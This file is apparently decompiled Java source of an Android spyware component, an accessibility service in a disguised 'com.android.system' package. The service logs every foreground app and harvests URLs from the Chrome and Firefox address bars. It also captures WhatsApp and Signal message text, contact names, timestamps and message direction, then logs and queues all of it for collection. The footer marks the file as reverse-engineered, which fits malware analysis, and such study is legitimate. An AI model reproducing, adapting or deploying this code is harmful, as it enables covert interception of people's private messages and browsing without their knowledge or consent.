package com.android.system;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.Rect;
import android.util.Patterns;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.app.system.common.entity.URLHistory;
import com.app.system.common.h.n;
import com.app.system.common.service.EventsAndReceiveService;
import com.security.WA.WaObject;
import com.security.a.b;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MyAccessibilityService
  extends AccessibilityService
{
  public static List<f> g = new ArrayList();
  private static String i = "";
  private static long j;
  String a = "";
  String b = "";
  boolean c = false;
  String d = "";
  String e = "";
  boolean f = false;
  n h = new n(CoreApp.a());
  
  private String a(String paramString)
  {
    PackageManager localPackageManager = getPackageManager();
    try
    {
      paramString = localPackageManager.getApplicationLabel(localPackageManager.getApplicationInfo(paramString, 128)).toString();
      return paramString;
    }
    catch (PackageManager.NameNotFoundException paramString) {}
    return "?";
  }
  
  private void a(AccessibilityEvent paramAccessibilityEvent) {}
  
  private static void a(AccessibilityNodeInfo paramAccessibilityNodeInfo)
  {
    a(paramAccessibilityNodeInfo, 0);
  }
  
  public static void a(AccessibilityNodeInfo paramAccessibilityNodeInfo, int paramInt)
  {
    if (paramAccessibilityNodeInfo == null) {
      return;
    }
    try
    {
      Rect localRect = new android/graphics/Rect;
      localRect.<init>();
      paramAccessibilityNodeInfo.getBoundsInScreen(localRect);
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append(paramInt);
      localStringBuilder.append("__");
      localStringBuilder.append(paramAccessibilityNodeInfo.getClassName());
      localStringBuilder.append(", ");
      localStringBuilder.append(paramAccessibilityNodeInfo.getViewIdResourceName());
      localStringBuilder.append(", ");
      localStringBuilder.append(paramAccessibilityNodeInfo.getText());
      localStringBuilder.append(" _bounds(");
      localStringBuilder.append(localRect.left);
      localStringBuilder.append(",");
      localStringBuilder.append(localRect.right);
      localStringBuilder.append(") package:");
      localStringBuilder.append(paramAccessibilityNodeInfo.getPackageName());
      com.security.d.a.e("Accessibility", localStringBuilder.toString(), new Object[0]);
      for (int k = 0; k < paramAccessibilityNodeInfo.getChildCount(); k++) {
        a(paramAccessibilityNodeInfo.getChild(k), paramInt + 1);
      }
      return;
    }
    catch (Exception paramAccessibilityNodeInfo)
    {
      com.security.d.a.e("Accessibility", "depthFirstSearchNodeProcessing: ".concat(paramAccessibilityNodeInfo.getMessage()), new Object[0]);
    }
    catch (StackOverflowError paramAccessibilityNodeInfo)
    {
      com.security.d.a.e("Accessibility", "depthFirstSearchNodeProcessing: ".concat(paramAccessibilityNodeInfo.getMessage()), new Object[0]);
    }
  }
  
  private void b(AccessibilityNodeInfo paramAccessibilityNodeInfo)
  {
    if (paramAccessibilityNodeInfo == null) {
      return;
    }
    ArrayList localArrayList = new ArrayList();
    localArrayList.add(paramAccessibilityNodeInfo);
    while (!localArrayList.isEmpty())
    {
      int k = 0;
      paramAccessibilityNodeInfo = (AccessibilityNodeInfo)localArrayList.remove(0);
      if (paramAccessibilityNodeInfo != null)
      {
        if (c(paramAccessibilityNodeInfo)) {
          return;
        }
        while (k < paramAccessibilityNodeInfo.getChildCount())
        {
          localArrayList.add(paramAccessibilityNodeInfo.getChild(k));
          k++;
        }
      }
    }
  }
  
  private void b(String paramString)
  {
    if (!Patterns.WEB_URL.matcher(paramString).matches()) {
      return;
    }
    Object localObject;
    if (g.isEmpty())
    {
      localObject = null;
    }
    else
    {
      localObject = g;
      localObject = ((f)((List)localObject).get(((List)localObject).size() - 1)).b;
    }
    if (!paramString.equals(localObject))
    {
      g.add(new f(System.currentTimeMillis(), paramString));
      localObject = new StringBuilder();
      ((StringBuilder)localObject).append("Url added:");
      ((StringBuilder)localObject).append(paramString);
      com.security.d.a.d("Accessibility", ((StringBuilder)localObject).toString(), new Object[0]);
      localObject = new URLHistory();
      ((URLHistory)localObject).b(0L);
      ((URLHistory)localObject).a(paramString);
      ((URLHistory)localObject).c(1L);
      ((URLHistory)localObject).a(System.currentTimeMillis() / 1000L);
      ((URLHistory)localObject).b(paramString);
      this.h.a((URLHistory)localObject);
    }
  }
  
  private boolean c(AccessibilityNodeInfo paramAccessibilityNodeInfo)
  {
    if (("android.widget.EditText".equals(paramAccessibilityNodeInfo.getClassName())) && ("com.android.chrome:id/url_bar".equals(paramAccessibilityNodeInfo.getViewIdResourceName())) && (paramAccessibilityNodeInfo.getText() != null))
    {
      b(paramAccessibilityNodeInfo.getText().toString());
      return true;
    }
    return false;
  }
  
  private void d(AccessibilityNodeInfo paramAccessibilityNodeInfo)
  {
    if (paramAccessibilityNodeInfo == null) {
      return;
    }
    ArrayList localArrayList = new ArrayList();
    localArrayList.add(paramAccessibilityNodeInfo);
    while (!localArrayList.isEmpty())
    {
      int k = 0;
      paramAccessibilityNodeInfo = (AccessibilityNodeInfo)localArrayList.remove(0);
      if (paramAccessibilityNodeInfo != null)
      {
        if (e(paramAccessibilityNodeInfo)) {
          return;
        }
        while (k < paramAccessibilityNodeInfo.getChildCount())
        {
          localArrayList.add(paramAccessibilityNodeInfo.getChild(k));
          k++;
        }
      }
    }
  }
  
  private boolean e(AccessibilityNodeInfo paramAccessibilityNodeInfo)
  {
    if (("android.widget.TextView".equals(paramAccessibilityNodeInfo.getClassName())) && ("org.mozilla.firefox:id/url_bar_title".equals(paramAccessibilityNodeInfo.getViewIdResourceName())) && (paramAccessibilityNodeInfo.getText() != null))
    {
      b(paramAccessibilityNodeInfo.getText().toString());
      return true;
    }
    return false;
  }
  
  private void f(AccessibilityNodeInfo paramAccessibilityNodeInfo)
  {
    if (paramAccessibilityNodeInfo == null) {
      return;
    }
    boolean bool = "android.widget.TextView".equals(paramAccessibilityNodeInfo.getClassName());
    int k = 0;
    int m = k;
    if (bool) {
      if ("com.whatsapp:id/conversation_contact_name".equals(paramAccessibilityNodeInfo.getViewIdResourceName()))
      {
        m = k;
        if (paramAccessibilityNodeInfo.getText() != null)
        {
          this.a = paramAccessibilityNodeInfo.getText().toString();
          m = k;
        }
      }
      else
      {
        m = k;
        if ("com.whatsapp:id/message_text".equals(paramAccessibilityNodeInfo.getViewIdResourceName()))
        {
          m = k;
          if (paramAccessibilityNodeInfo.getText() != null)
          {
            WaObject localWaObject = new WaObject();
            localWaObject.Contact = this.a;
            localWaObject.Message = paramAccessibilityNodeInfo.getText().toString();
            localWaObject.Time = g(paramAccessibilityNodeInfo);
            Rect localRect = new Rect();
            paramAccessibilityNodeInfo.getBoundsInScreen(localRect);
            if (localRect.left < 100) {
              bool = true;
            } else {
              bool = false;
            }
            localWaObject.Incoming = bool;
            localWaObject.CaptureTime = (System.currentTimeMillis() / 1000L);
            com.security.WA.a.a().a(localWaObject);
            com.security.d.a.e("Accessibility", String.format("WAMSG contact='%s', msg='%s', time='%s', in=%d", new Object[] { localWaObject.Contact, localWaObject.Message, localWaObject.Time, Integer.valueOf(localWaObject.Incoming) }), new Object[0]);
            return;
          }
        }
      }
    }
    while (m < paramAccessibilityNodeInfo.getChildCount())
    {
      f(paramAccessibilityNodeInfo.getChild(m));
      m++;
    }
  }
  
  private static String g(AccessibilityNodeInfo paramAccessibilityNodeInfo)
  {
    if (paramAccessibilityNodeInfo != null)
    {
      paramAccessibilityNodeInfo = paramAccessibilityNodeInfo.getParent();
      if (paramAccessibilityNodeInfo != null)
      {
        if (paramAccessibilityNodeInfo.getChildCount() > 1)
        {
          paramAccessibilityNodeInfo = paramAccessibilityNodeInfo.getChild(1);
          if ((paramAccessibilityNodeInfo != null) && (paramAccessibilityNodeInfo.getChildCount() > 0))
          {
            paramAccessibilityNodeInfo = paramAccessibilityNodeInfo.getChild(0);
            if ((paramAccessibilityNodeInfo != null) && ("android.widget.TextView".equals(paramAccessibilityNodeInfo.getClassName())) && ("com.whatsapp:id/date".equals(paramAccessibilityNodeInfo.getViewIdResourceName())) && (paramAccessibilityNodeInfo.getText() != null)) {
              return paramAccessibilityNodeInfo.getText().toString();
            }
          }
        }
        return null;
      }
    }
    return null;
  }
  
  private void h(AccessibilityNodeInfo paramAccessibilityNodeInfo)
  {
    if (paramAccessibilityNodeInfo == null) {
      return;
    }
    boolean bool = "android.widget.TextView".equals(paramAccessibilityNodeInfo.getClassName());
    int k = 0;
    int m = k;
    if (bool) {
      if ("org.thoughtcrime.securesms:id/title".equals(paramAccessibilityNodeInfo.getViewIdResourceName()))
      {
        m = k;
        if (paramAccessibilityNodeInfo.getText() != null)
        {
          this.d = paramAccessibilityNodeInfo.getText().toString();
          m = k;
        }
      }
      else
      {
        m = k;
        if ("org.thoughtcrime.securesms:id/conversation_item_body".equals(paramAccessibilityNodeInfo.getViewIdResourceName()))
        {
          m = k;
          if (paramAccessibilityNodeInfo.getText() != null)
          {
            b localb = new b();
            localb.a = this.d;
            localb.c = paramAccessibilityNodeInfo.getText().toString();
            localb.b = i(paramAccessibilityNodeInfo);
            Rect localRect = new Rect();
            paramAccessibilityNodeInfo.getBoundsInScreen(localRect);
            if (localRect.left < 100) {
              bool = true;
            } else {
              bool = false;
            }
            localb.d = bool;
            localb.e = (System.currentTimeMillis() / 1000L);
            com.security.a.a.a().a(localb);
            com.security.d.a.e("Accessibility", String.format("SIGMSG contact='%s', msg='%s', time='%s', in=%d", new Object[] { localb.a, localb.c, localb.b, Integer.valueOf(localb.d) }), new Object[0]);
            return;
          }
        }
      }
    }
    while (m < paramAccessibilityNodeInfo.getChildCount())
    {
      h(paramAccessibilityNodeInfo.getChild(m));
      m++;
    }
  }
  
  private static String i(AccessibilityNodeInfo paramAccessibilityNodeInfo)
  {
    if (paramAccessibilityNodeInfo != null)
    {
      paramAccessibilityNodeInfo = paramAccessibilityNodeInfo.getParent();
      if (paramAccessibilityNodeInfo != null)
      {
        if (paramAccessibilityNodeInfo.getChildCount() > 1)
        {
          paramAccessibilityNodeInfo = paramAccessibilityNodeInfo.getChild(1);
          if ((paramAccessibilityNodeInfo != null) && (paramAccessibilityNodeInfo.getChildCount() > 0))
          {
            paramAccessibilityNodeInfo = paramAccessibilityNodeInfo.getChild(0);
            if ((paramAccessibilityNodeInfo != null) && ("android.widget.TextView".equals(paramAccessibilityNodeInfo.getClassName())) && ("org.thoughtcrime.securesms:id/footer_date".equals(paramAccessibilityNodeInfo.getViewIdResourceName())) && (paramAccessibilityNodeInfo.getText() != null)) {
              return paramAccessibilityNodeInfo.getText().toString();
            }
          }
        }
        return null;
      }
    }
    return null;
  }
  
  public void onAccessibilityEvent(AccessibilityEvent paramAccessibilityEvent)
  {
    try
    {
      CharSequence localCharSequence = paramAccessibilityEvent.getPackageName();
      if (localCharSequence == null) {
        return;
      }
      if (paramAccessibilityEvent.getEventType() == 32)
      {
        String str1 = paramAccessibilityEvent.getPackageName().toString();
        if ((str1 != null) && (!str1.isEmpty())) {
          synchronized (i)
          {
            if (!str1.equals(i))
            {
              i = str1;
              j = System.currentTimeMillis();
              str1 = a(i);
              com.security.d.a.d("Accessibility", String.format("APP IN FOREGROUND: %s (%s)", new Object[] { str1, i }), new Object[0]);
              Intent localIntent = new android/content/Intent;
              localIntent.<init>(this, EventsAndReceiveService.class);
              localIntent.putExtra("event_core_app", "event_send_active_app");
              localIntent.putExtra("app_name", str1);
              localIntent.putExtra("pkg_name", i);
              localIntent.putExtra("timestamp", j);
              com.b.a.a.a.a(this, localIntent);
            }
          }
        }
      }
      a(paramAccessibilityEvent.getSource());
      int k = paramAccessibilityEvent.getEventType();
      if ((localCharSequence.equals("org.mozilla.firefox")) && ((k == 2048) || (k == 32))) {
        d(paramAccessibilityEvent.getSource());
      }
      if ((localCharSequence.equals("com.android.chrome")) && ((k == 2048) || (k == 32))) {
        b(paramAccessibilityEvent.getSource());
      }
      if ((localCharSequence.equals("com.whatsapp")) && ((k == 2048) || (k == 32))) {
        f(paramAccessibilityEvent.getSource());
      }
      if ((localCharSequence.equals("org.thoughtcrime.securesms")) && ((k == 2048) || (k == 32))) {
        h(paramAccessibilityEvent.getSource());
      }
      if ((localCharSequence.equals("com.facebook.orca")) && ((k == 2048) || (k == 32))) {
        a(paramAccessibilityEvent);
      }
    }
    catch (Exception localException)
    {
      paramAccessibilityEvent = new StringBuilder();
      paramAccessibilityEvent.append("Exception: ");
      paramAccessibilityEvent.append(localException.getMessage());
      com.security.d.a.d("Accessibility", paramAccessibilityEvent.toString(), new Object[0]);
    }
  }
  
  public void onInterrupt()
  {
    com.security.d.a.d("Accessibility", "Interrupt", new Object[0]);
  }
  
  protected void onServiceConnected()
  {
    com.security.d.a.d("Accessibility", "Servizio collegato", new Object[0]);
  }
  
  public boolean onUnbind(Intent paramIntent)
  {
    com.security.d.a.d("Accessibility", "Service Started", new Object[0]);
    return super.onUnbind(paramIntent);
  }
}


/* Location:              ~/com/android/system/MyAccessibilityService.class
 *
 * Reversed by:           J
 */